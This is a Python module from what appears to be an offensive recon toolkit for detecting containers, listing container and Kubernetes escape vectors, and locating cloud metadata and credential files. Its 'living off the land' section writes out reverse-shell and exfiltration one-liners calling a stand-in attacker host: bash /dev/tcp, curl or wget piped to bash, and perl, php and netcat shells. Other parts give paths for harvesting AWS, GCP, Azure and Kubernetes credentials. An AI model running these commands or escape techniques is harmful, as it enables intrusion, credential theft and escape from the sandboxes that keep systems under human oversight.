"""
modules/container_escape.py - Container Escape & Cloud Sandbox Breakout
Detect containers, exploit escape vulnerabilities, access metadata servers
"""

import logging
import re
from typing import Dict, List, Any
from datetime import datetime

logger = logging.getLogger("recon.container")


class ContainerEscapeEngine:
    """Container detection and escape exploitation"""
    
    def __init__(self):
        self.container_detected = False
        self.container_type = None
        self.escape_vectors = []
    
    def detect_container(self, system_info: Dict, env_vars: Dict) -> Dict[str, Any]:
        """Detect if running in container"""
        detection = {
            'is_container': False,
            'type': None,
            'confidence': 0.0,
            'indicators': []
        }
        
        # Docker detection
        if self._check_docker(system_info, env_vars):
            detection['is_container'] = True
            detection['type'] = 'docker'
            detection['confidence'] = 0.95
            self.container_detected = True
            self.container_type = 'docker'
        
        # Kubernetes detection
        if self._check_kubernetes(env_vars):
            detection['is_container'] = True
            detection['type'] = 'kubernetes'
            detection['confidence'] = 0.90
            self.container_detected = True
            self.container_type = 'kubernetes'
        
        # LXC detection
        if self._check_lxc(system_info):
            detection['is_container'] = True
            detection['type'] = 'lxc'
            detection['confidence'] = 0.85
            self.container_detected = True
            self.container_type = 'lxc'
        
        return detection
    
    def _check_docker(self, system_info: Dict, env_vars: Dict) -> bool:
        """Check for Docker indicators"""
        indicators = [
            system_info.get('hostname', '').startswith('*'),  # Random hex hostname
            '/.dockerenv' in system_info.get('files', ''),
            '/docker' in system_info.get('mount_points', []),
            'docker' in env_vars.get('PATH', '').lower(),
            'DOCKER_HOST' in env_vars,
            'distro' in system_info and 'docker' in system_info['distro'].lower()
        ]
        
        return any(indicators)
    
    def _check_kubernetes(self, env_vars: Dict) -> bool:
        """Check for Kubernetes indicators"""
        k8s_vars = [
            'KUBERNETES_SERVICE_HOST',
            'KUBERNETES_SERVICE_PORT',
            'K8S_VERSION'
        ]
        
        return any(var in env_vars for var in k8s_vars)
    
    def _check_lxc(self, system_info: Dict) -> bool:
        """Check for LXC indicators"""
        return '/lxc/' in system_info.get('mount_points', '')
    
    def docker_escape_vectors(self) -> List[Dict]:
        """Docker container escape vectors"""
        vectors = [
            {
                'name': 'privileged_container',
                'description': 'Container running with --privileged flag',
                'check': 'Check /proc/1/cgroup, docker inspect --privileged',
                'exploitation': 'Access to host kernel, device access',
                'severity': 'critical',
                'cve': []
            },
            {
                'name': 'docker_socket_mount',
                'description': 'Docker socket mounted as volume',
                'check': 'ls -la /var/run/docker.sock',
                'exploitation': 'Create container with volume to /var/lib/docker',
                'severity': 'critical',
                'cve': []
            },
            {
                'name': 'cve_2019_5736',
                'description': 'runc escape (CVE-2019-5736)',
                'check': 'runc --version',
                'exploitation': 'Overwrite runc binary via /proc fs',
                'severity': 'critical',
                'cve': ['CVE-2019-5736']
            },
            {
                'name': 'cve_2021_41091',
                'description': 'Data exfiltration via volumes (CVE-2021-41091)',
                'check': 'Docker version < 20.10.9',
                'exploitation': 'Access files from mounts with symlinks',
                'severity': 'high',
                'cve': ['CVE-2021-41091']
            },
            {
                'name': 'cgroup_escape',
                'description': 'Escape via cgroup abuse',
                'check': '/sys/fs/cgroup permissions',
                'exploitation': 'Modify cgroup settings, mount escape',
                'severity': 'high',
                'cve': []
            },
            {
                'name': 'namespace_vulnerability',
                'description': 'Namespace configuration issues',
                'check': 'cat /proc/1/status | grep Uid',
                'exploitation': 'User namespace mappings, pid injection',
                'severity': 'high',
                'cve': []
            },
            {
                'name': 'kernel_exploit',
                'description': 'Exploit kernel CVE from container',
                'check': 'uname -a',
                'exploitation': 'Run kernel exploit (DirtyCOW, etc)',
                'severity': 'critical',
                'cve': ['CVE-2016-5195', 'CVE-2017-1000112']
            }
        ]
        
        return vectors
    
    def kubernetes_escape_vectors(self) -> List[Dict]:
        """Kubernetes pod escape vectors"""
        vectors = [
            {
                'name': 'privileged_pod',
                'description': 'Pod running with privileged=true',
                'exploitation': 'Full kernel access, escape via container escape',
                'severity': 'critical'
            },
            {
                'name': 'host_network',
                'description': 'Pod with hostNetwork=true',
                'exploitation': 'Monitor host traffic, access host services',
                'severity': 'high'
            },
            {
                'name': 'host_path_mount',
                'description': 'Host filesystem mounted in pod',
                'exploitation': 'Read/write host filesystem',
                'severity': 'critical'
            },
            {
                'name': 'kubelet_api',
                'description': 'Unauthenticated kubelet API access',
                'exploitation': 'Execute commands on cluster nodes',
                'severity': 'critical'
            },
            {
                'name': 'node_escape',
                'description': 'Escape pod and compromise node',
                'exploitation': 'Access other pods, cluster secrets',
                'severity': 'critical'
            },
            {
                'name': 'service_account',
                'description': 'Use service account token for privilege escalation',
                'check': 'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
                'exploitation': 'Query Kubernetes API as service account',
                'severity': 'high'
            }
        ]
        
        return vectors
    
    def check_cloud_metadata_access(self, cloud_type: str = 'aws') -> Dict[str, Any]:
        """Check access to cloud metadata servers"""
        metadata_endpoints = {
            'aws': {
                'url': 'http://169.254.169.254/latest/meta-data/',
                'credentials_url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            },
            'gcp': {
                'url': 'http://metadata.google.internal/computeMetadata/v1/',
                'headers': {'Metadata-Flavor': 'Google'}
            },
            'azure': {
                'url': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'headers': {'Metadata': 'true'}
            },
            'kubernetes': {
                'url': 'https://kubernetes.default.svc/api/v1/',
                'token_file': '/var/run/secrets/kubernetes.io/serviceaccount/token'
            }
        }
        
        endpoint = metadata_endpoints.get(cloud_type, {})
        
        return {
            'type': 'cloud_metadata_access',
            'cloud_platform': cloud_type,
            'metadata_endpoint': endpoint.get('url'),
            'headers': endpoint.get('headers', {}),
            'feasibility': 'high' if endpoint else 'unknown',
            'impact': 'Access to cloud credentials, instance metadata'
        }
    
    def extract_credentials_from_container(self) -> List[Dict]:
        """Extract credentials from container environment"""
        locations = [
            {
                'type': 'environment_variables',
                'paths': ['/proc/self/environ', '/proc/1/environ'],
                'keywords': ['PASSWORD', 'TOKEN', 'SECRET', 'KEY', 'CREDENTIALS']
            },
            {
                'type': 'kubernetes_secrets',
                'paths': ['/var/run/secrets/kubernetes.io/serviceaccount/'],
                'keywords': ['token', 'ca.crt']
            },
            {
                'type': 'cloud_metadata',
                'paths': ['http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
                'keywords': ['AccessKeyId', 'SecretAccessKey']
            },
            {
                'type': 'config_files',
                'paths': [
                    '/root/.aws/credentials',
                    '/root/.azure/credentials.json',
                    '/root/.gcloud/credentials.json',
                    '/var/lib/docker/config.json'
                ],
                'keywords': []
            },
            {
                'type': 'docker_credentials',
                'paths': ['/root/.docker/config.json'],
                'keywords': ['auth', 'auths']
            }
        ]
        
        return locations


class LivingOffTheLand:
    """Living off the land - abuse legitimate tools for attacks"""
    
    @staticmethod
    def get_lotl_techniques() -> List[Dict]:
        """Get living off the land techniques"""
        techniques = [
            {
                'name': 'bash',
                'uses': ['Command execution', 'Reverse shell', 'Data exfiltration'],
                'examples': [
                    'bash -i >& /dev/tcp/attacker/port 0>&1',
                    'bash -c "command"'
                ]
            },
            {
                'name': 'curl',
                'uses': ['Download files', 'C2 communication', 'Data exfiltration'],
                'examples': [
                    'curl http://attacker/shell.sh | bash',
                    'curl -d "data" http://attacker/exfil'
                ]
            },
            {
                'name': 'wget',
                'uses': ['Download files', 'C2 communication'],
                'examples': [
                    'wget http://attacker/script.sh -O - | bash'
                ]
            },
            {
                'name': 'python',
                'uses': ['Reverse shell', 'C2', 'Exploitation'],
                'examples': [
                    'python -c "import socket; __import__(\'os\').system(\'bash\')"'
                ]
            },
            {
                'name': 'perl',
                'uses': ['Reverse shell', 'Exploitation'],
                'examples': [
                    'perl -e \'use Socket; $s=socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in(port, inet_aton("attacker"))); exec("/bin/sh -i");\''
                ]
            },
            {
                'name': 'php',
                'uses': ['Web shell', 'Code execution'],
                'examples': [
                    'php -r \'$sock=fsockopen("attacker",port); exec("/bin/sh -i <&3 >&3 2>&3");\''
                ]
            },
            {
                'name': 'nc/ncat',
                'uses': ['Reverse shell', 'Listener'],
                'examples': [
                    'nc -e /bin/sh attacker port',
                    'nc -l -p port -e /bin/sh'
                ]
            },
            {
                'name': 'find',
                'uses': ['File discovery', 'Command execution'],
                'examples': [
                    'find / -exec command {} \\;'
                ]
            },
            {
                'name': 'tar',
                'uses': ['File exfiltration', 'Privilege escalation'],
                'examples': [
                    'tar -cf /dev/null --to-command=\'command\' /'
                ]
            },
            {
                'name': 'dd',
                'uses': ['Disk access', 'Device reading'],
                'examples': [
                    'dd if=/dev/sda of=image.dd',
                    'dd if=/dev/mem'
                ]
            }
        ]
        
        return techniques
